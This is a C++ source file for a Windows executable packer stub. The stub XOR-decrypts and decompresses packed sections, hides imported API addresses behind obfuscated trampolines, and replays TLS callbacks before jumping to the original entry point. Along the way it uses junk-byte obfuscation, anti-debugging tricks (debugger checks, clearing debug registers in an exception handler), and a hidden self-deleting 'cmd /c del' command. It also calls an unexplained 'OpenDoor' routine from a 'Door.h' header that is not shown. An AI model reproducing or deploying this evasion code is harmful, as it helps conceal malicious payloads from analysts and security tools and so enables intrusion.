#include <windows.h>
#include <winternl.h>
#define ZLIB_WINAPI
#include "zlib.h"
#include <stdlib.h>
#pragma comment(lib,"zlibstat.lib")
#include "Door.h"

#pragma comment(linker,"/merge:.data=.text")
#pragma comment(linker,"/merge:.rdata=.text")
#pragma comment(linker,"/merge:.tls=.text")
#pragma comment(linker, "/section:.text,RWE")
#pragma comment(linker,"/INCLUDE:__tls_used")
#pragma comment(linker, "/INCLUDE:_tls_callback_arr")

#define _MAX_SECTION__ 0x10

struct StubConfigure {
	unsigned int g_targetOep;
	DWORD dwTextRva;
	DWORD dwTextSize;
	DWORD dwIATRva;
	DWORD dwIATSize;
	DWORD dwRelocationRva;
	DWORD dwRelocationSize;
	DWORD dwTlsRva;
	DWORD dwTlsSize;
	DWORD dwImageBase;
	DWORD cryptkey;
};

struct StubCompress {
	DWORD dwSectionAddr;
	DWORD dwSectionSize;
	DWORD dwSectionCompressSize;
	DWORD dwSectionDecryptSize;
};

const unsigned char RoundKey[] = {
	0x11, 0x43, 0x91, 0x72,
	0x19, 0xA1, 0x2B, 0x9C,
	0x4F, 0x9D, 0x82, 0xFC,
	0x7D, 0x3C, 0x21, 0x69, 0x76
};

bool OpenDoor();
bool decompress_section();
bool Decrypt();
void FixPeIAT();
void fixPeRelocal();
void CallTlsFirst();
VOID NTAPI TlsCallBackStub(PVOID DllHandle, DWORD Reason, PVOID Reserved);
static void CallTlsFirstOrNot(bool is_first_time, PVOID DllHandle, DWORD Reason, PVOID Reserved);
void AntiDebug();
void ConfuseDebugger();
void GetMoudleHandleFake();
LONG WINAPI SEHDefaultHandler(struct _EXCEPTION_POINTERS *ExceptionInfo);
BOOL SelfDelete(void);

int g_AntiDebugNum = 0;
int g_CallTLSTime = 0;
PVOID g_Reserved = nullptr;

#pragma data_seg(".CRT$XLB")
extern "C" PIMAGE_TLS_CALLBACK tls_callback_arr[] = { TlsCallBackStub , NULL };
#pragma data_seg()

extern"C" __declspec(dllexport) unsigned int g_targetOep = -1;
extern "C" __declspec(dllexport) StubConfigure g_Storage_Recovery_Data = { 0 };
extern"C" __declspec(dllexport) unsigned int g_Compress_Section_Num = 0;
extern "C" __declspec(dllexport) StubCompress g_Storage_Compress_Section_Data[_MAX_SECTION__] = { 0 };
extern"C" __declspec(dllexport) void __declspec(naked) start() {
	_asm {
		jmp JMP1;
		_emit 0x20;
		_emit 0x56;
		_emit 0x78;
		_emit 0xE8;
		_emit 0x56;
		_emit 0x56;
		_emit 0xE9;
		_emit 0x56;
		_emit 0x78;
		_emit 0xE8;
		_emit 0x56;
		_emit 0x56;
		_emit 0xE9;
		_emit 0x56;
		_emit 0x78;
		_emit 0xE8;
		_emit 0x56;
		_emit 0x56;
		_emit 0xE9;
	JMP1:
		push eax;
		mov eax, 50;
		jmp JMP2;
		_emit 0x56;
		_emit 0x78;
		_emit 0xE8;
		_emit 0x56;
		_emit 0x56;
		_emit 0xE9;
		_emit 0x20;
		_emit 0x56;
		_emit 0x78;
		_emit 0xE8;
		_emit 0x56;
		_emit 0x56;
		_emit 0xE9;
		_emit 0x56;
		_emit 0x78;
		_emit 0xE8;
		_emit 0x56;
		_emit 0x56;
		_emit 0xE9;
		_emit 0x56;
		_emit 0x78;
		_emit 0xE8;
		_emit 0x56;
		_emit 0x56;
		_emit 0xE9;
	JMP2:
		pop eax;
		push eax;
		mov eax, 100;
		jmp JMP3;
		_emit 0x0F;
		_emit 0xF2;
		_emit 0xE8;
		_emit 0x56;
		_emit 0x56;
		_emit 0xE9;
		_emit 0x56;
		_emit 0x78;
		_emit 0xE8;
		_emit 0x56;
		_emit 0x56;
		_emit 0xE9;
		_emit 0x20;
		_emit 0x56;
		_emit 0x78;
		_emit 0xE8;
		_emit 0x56;
		_emit 0x56;
		_emit 0xE9;
		_emit 0x56;
		_emit 0x78;
		_emit 0xE8;
		_emit 0x56;
		_emit 0x56;
		_emit 0xE9;
		_emit 0x56;
		_emit 0x78;
		_emit 0xE8;
		_emit 0x56;
		_emit 0x56;
		_emit 0xE9;
	JMP3:
		pop eax;
	}

	for (int i = 0; i < 1000; i++) {
		ConfuseDebugger();
	}

	for (int i = 0; i < 1000; i++) {
		ConfuseDebugger();
	}

	ConfuseDebugger();
	AntiDebug();

	OpenDoor();
	_asm push eax;
	_asm jmp _Label1;
_Label0:
	GetMoudleHandleFake();
_Label02:
	_asm push eax;
	_asm push ebx;
	_asm mov ebx, ConfuseDebugger;
	_asm call ebx;
	_asm jmp _Label03;
	_asm _emit 0xB8;
	_asm _emit 0x11;
	_asm _emit 0x22;
	_asm _emit 0x33;
	_asm _emit 0x44;
	_asm _emit 0x60;
	_asm _emit 0xE9;
	_asm _emit 0x11;
_Label04:
	Decrypt();
	decompress_section();
	FixPeIAT();
	fixPeRelocal();
	CallTlsFirst();

	_asm jmp g_Storage_Recovery_Data.g_targetOep;

_Label1:
	ConfuseDebugger();
	ConfuseDebugger();
	ConfuseDebugger();
	_asm pop eax;
	_asm jmp _Label0;
_Label03:
	_asm pop ebx;
	_asm pop eax;
	_asm jmp _Label04;
}

void ConfuseDebugger() {
	_asm {
		jmp JMP1;
		_emit 0x20;
	JMP1:
		push eax;
		mov eax, 50;
		jmp JMP2;
		_emit 0x56;
		_emit 0x78;
		_emit 0xE8;
		_emit 0x56;
		_emit 0x56;
		_emit 0xE9;
	JMP2:
		pop eax;
		push eax;
		mov eax, 100;
		jmp JMP3;
		_emit 0x0F;
		_emit 0xF2;
		_emit 0xE8;
		_emit 0x56;
		_emit 0x56;
		_emit 0xE9;
	JMP3:
		pop eax;
	}
}

void AntiDebug() {
	if (IsDebuggerPresent()) {
		ExitProcess(0);
		SelfDelete();
	}

	SetUnhandledExceptionFilter(SEHDefaultHandler);

	_asm {
		push eax;
		mov eax, 0;
		mov dword ptr[eax], 0;
		pop eax;
	}
}

bool OpenDoor() {
	CDoor door_obj;
	return door_obj.InitDoor();
}

void GetMoudleHandleFake() {
	/* ASM Reason, So We'd better use like this */
	g_Storage_Recovery_Data.g_targetOep += (SIZE_T)GetModuleHandleA(NULL);
}

static bool decompress_code(_Out_opt_ char*& pDst, _Out_opt_ int* pDstLen, _In_ char* pSrc, _In_ int srcLen) {
	if (uncompress((byte*)pDst, (uLongf*)pDstLen, (Bytef*)pSrc, srcLen) != Z_OK) {
		return false;
	}

	return true;
}

bool decompress_section() {
	SIZE_T hModule = (SIZE_T)GetModuleHandleA(NULL);
	DWORD oldProt;
	bool ret;

	for (unsigned int i = 0; i < g_Compress_Section_Num; i++) {
		int dwDecompressSize = g_Storage_Compress_Section_Data[i].dwSectionSize;
		char* pTextInMem = (char*)(g_Storage_Compress_Section_Data[i].dwSectionAddr + hModule);
		char* pRecoveryText = new char[g_Storage_Compress_Section_Data[i].dwSectionSize]{};

		/* Decompress Code */
		VirtualProtect(pTextInMem, g_Storage_Compress_Section_Data[i].dwSectionCompressSize, PAGE_READWRITE, &oldProt);
		ret = decompress_code(
			pRecoveryText, &dwDecompressSize,
			pTextInMem, g_Storage_Compress_Section_Data[i].dwSectionCompressSize);
		VirtualProtect(pTextInMem, g_Storage_Compress_Section_Data[i].dwSectionCompressSize, oldProt, &oldProt);

		if (!ret)
			goto err;

		/* ReWrite It to memory */
		for (int i = 0; i < dwDecompressSize; i++) {
			VirtualProtect(&pTextInMem[i], 1, PAGE_READWRITE, &oldProt);
			pTextInMem[i] = pRecoveryText[i];
			VirtualProtect(&pTextInMem[i], 1, oldProt, &oldProt);
		}

		if (pRecoveryText) {
			delete[] pRecoveryText;
			pRecoveryText = nullptr;
		}
	}

	MessageBox(0, L"Success", L"Decompress", 0);
	return ret;

err:
	MessageBox(0, L"Err", L"Decompress", 0);
	return false;
}

static bool DecryptSection(_In_ char*& pSrc, _In_ int srcLen) {
	DWORD oldProt;

	for (int i = 0; i < srcLen; i++) {
		VirtualProtect(&pSrc[i], 1, PAGE_READWRITE, &oldProt);
		pSrc[i] ^= RoundKey[i % 0x11];
		VirtualProtect(&pSrc[i], 1, oldProt, &oldProt);
	}

	return true;
}

bool Decrypt() {
	SIZE_T hModule = (SIZE_T)GetModuleHandleA(NULL);
	bool ret;

	for (unsigned int i = 0; i < g_Compress_Section_Num; i++) {
		int dwDecryptSize = g_Storage_Compress_Section_Data[i].dwSectionCompressSize;
		char* pSectionInMem = (char*)(g_Storage_Compress_Section_Data[i].dwSectionAddr + hModule);

		ret = DecryptSection(pSectionInMem, dwDecryptSize);
		if (!ret)
			goto err;
	}

	MessageBox(0, L"Decrypt", L"Success", 0);
	return ret;

err:
	MessageBox(0, L"Decrypt", L"Failed", 0);
	return false;
}

void FixPeIAT() {
	SIZE_T hModule = (SIZE_T)GetModuleHandleA(NULL);
	DWORD IatRva = g_Storage_Recovery_Data.dwIATRva;
	IMAGE_IMPORT_DESCRIPTOR* pIat = (IMAGE_IMPORT_DESCRIPTOR*)(IatRva + hModule);
	DWORD oldProt = 0;

	while (pIat->OriginalFirstThunk) {
		IMAGE_THUNK_DATA32* sub_int = (IMAGE_THUNK_DATA32*)(pIat->OriginalFirstThunk + hModule);
		IMAGE_THUNK_DATA32* sub_iat = (IMAGE_THUNK_DATA32*)(pIat->FirstThunk + hModule);
		HMODULE hModuleImport = LoadLibraryA((char*)(pIat->Name + hModule));

		do {
			IMAGE_IMPORT_BY_NAME* pImportByName = (IMAGE_IMPORT_BY_NAME*)(sub_int->u1.AddressOfData + hModule);
			DWORD addr_import = (DWORD)GetProcAddress(hModuleImport, pImportByName->Name);
			LPVOID pHideCode = VirtualAlloc( NULL, 10, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			((LPBYTE)pHideCode)[0] = 0xB8;
			for (int i = 0; i < 4; i++) {
				((LPBYTE)pHideCode)[1 + i] = ((addr_import ^ 0x15) >> (8 * i)) & 0xFF;
			}

			((LPBYTE)pHideCode)[5] = 0x83;
			((LPBYTE)pHideCode)[6] = 0xF0;
			((LPBYTE)pHideCode)[7] = 0x15;
			((LPBYTE)pHideCode)[8] = 0xFF;
			((LPBYTE)pHideCode)[9] = 0xE0;

			/* Encrypt IAT */
			VirtualProtect(sub_iat, 4, PAGE_READWRITE, &oldProt);
			sub_iat->u1.Function = (DWORD)pHideCode;
			VirtualProtect(sub_iat, 4, oldProt, &oldProt);

			sub_int++;
			sub_iat++;
		} while (sub_int->u1.AddressOfData);

		pIat++;
	}

	MessageBox(0, L"IAT", L"OK", 0);
}

void fixPeRelocal() {
	SIZE_T hModule = (SIZE_T)GetModuleHandleA(NULL);
	DWORD relRva = g_Storage_Recovery_Data.dwRelocationRva;
	IMAGE_BASE_RELOCATION* pRel = (IMAGE_BASE_RELOCATION*)(relRva + (SIZE_T)hModule);

	struct TypeOffset {
		WORD ofs : 12;
		WORD type : 4;
	};

	TypeOffset* pTypOfs;
	DWORD oldProt;

	while (pRel->SizeOfBlock != 0) {
		pTypOfs = (TypeOffset*)(pRel + 1);
		int count = (pRel->SizeOfBlock - 8) / 2;
		for (int i = 0; i < count; ++i) {
			if (pTypOfs[i].type == 3) {
				DWORD rva = pTypOfs[i].ofs + pRel->VirtualAddress;
				SIZE_T* va = (SIZE_T*)(rva + (SIZE_T)hModule);
				VirtualProtect(va, 4, PAGE_READWRITE, &oldProt);
				/* Notice: Something Wrong If Use Following-C */
				// *va -= g_Storage_Recovery_Data.dwImageBase;
				// *va += hModule;
				_asm {
					push eax;
					mov eax, dword ptr[va];
					sub eax, g_Storage_Recovery_Data.dwImageBase;
					add eax, hModule;
					mov dword ptr[va], eax;
					pop eax;
				}
				VirtualProtect(va, 4, oldProt, &oldProt);
			}
		}

		pRel = (IMAGE_BASE_RELOCATION*)((char*)pRel + pRel->SizeOfBlock);
	}

	MessageBox(0, L"Relocation", L"OK", 0);
}

VOID NTAPI TlsCallBackStub(PVOID DllHandle, DWORD Reason, PVOID Reserved) {
	MessageBox(0, L"MY_TLS", L"MY_TLS", 0);
	if (!g_CallTLSTime++) {
		g_Reserved = Reserved;
		return;
	}
	
	CallTlsFirstOrNot(false, DllHandle, Reason, Reserved);
}

void CallTlsFirst() {
	/* Hide GetModuleHandle, So Make a new Func */
	MessageBox(0, L"TLSCALLBACK", L"OK", 0);
	if (g_CallTLSTime == 0)
		CallTlsFirstOrNot(true, GetModuleHandleA(NULL), DLL_PROCESS_ATTACH, g_Reserved);
}

static void CallTlsFirstOrNot(bool is_first_time, PVOID DllHandle, DWORD Reason, PVOID Reserved) {
	if (g_Storage_Recovery_Data.dwTlsSize) {
		SIZE_T hModule = (SIZE_T)GetModuleHandleA(NULL);
		DWORD tlsRva = g_Storage_Recovery_Data.dwTlsRva;
		IMAGE_TLS_DIRECTORY32* pTls = (IMAGE_TLS_DIRECTORY32*)(tlsRva + hModule);

		/* First Time Call Tls, Need Fix */
		if (is_first_time) {
			int* p = (int*)pTls;
			DWORD oldProt;

			for (int i = 0; i < 4; i++, p++) {
				if (i == 3) {
					VirtualProtect(p, 4, PAGE_READWRITE, &oldProt);
					*p -= g_Storage_Recovery_Data.dwImageBase;
					*p += hModule;
					VirtualProtect(p, 4, oldProt, &oldProt);

					int* pCallback = nullptr;
					_asm {
						push eax;
						mov eax, dword ptr[p];
						mov pCallback, eax;
						pop eax;
					}

					do {
						VirtualProtect(pCallback, 4, PAGE_READWRITE, &oldProt);
						*pCallback -= g_Storage_Recovery_Data.dwImageBase;
						*pCallback += hModule;
						pCallback++;
						VirtualProtect(pCallback, 4, oldProt, &oldProt);
					} while (*pCallback);
				}
			}
		}

		/* Call TLS */
		PIMAGE_TLS_CALLBACK* pCallBack = (PIMAGE_TLS_CALLBACK*)pTls->AddressOfCallBacks;
		do {
			PIMAGE_TLS_CALLBACK tlsfun = *pCallBack;
			_asm {
				push DllHandle;
				push Reason;
				push Reserved;
				call tlsfun;
			}
			pCallBack++;
		} while (*pCallBack);
	}
}

LONG WINAPI SEHDefaultHandler(struct _EXCEPTION_POINTERS *ExceptionInfo) {
	MessageBox(0, L"SEHDefaultHandler", L"SEHDefaultHandler", 0);
	ExceptionInfo->ContextRecord->Eax = (DWORD)&g_AntiDebugNum;
	ExceptionInfo->ContextRecord->Dr0 = 0;
	ExceptionInfo->ContextRecord->Dr1 = 0;
	ExceptionInfo->ContextRecord->Dr2 = 0;
	ExceptionInfo->ContextRecord->Dr3 = 0;
	ExceptionInfo->ContextRecord->Dr6 = 0xFFFF0FF0;
	ExceptionInfo->ContextRecord->Dr7 = 0x155;
	return -1;
}

BOOL SelfDelete(void) {
	TCHAR szFile[MAX_PATH];
	TCHAR szCommand[MAX_PATH];
	if (GetModuleFileName(NULL, szFile, MAX_PATH) &&
		GetShortPathName(szFile, szFile, MAX_PATH)) {
		lstrcpy(szCommand, L"/c del ");
		lstrcat(szCommand, szFile);
		lstrcat(szCommand, L" >> NUL");
		if (GetEnvironmentVariable(
			L"ComSpec", szFile, MAX_PATH) &&
			(INT)ShellExecute(0, 0, szFile, szCommand, 0, SW_HIDE) > 32) {
			return TRUE;
		}
	}

	return FALSE;
}
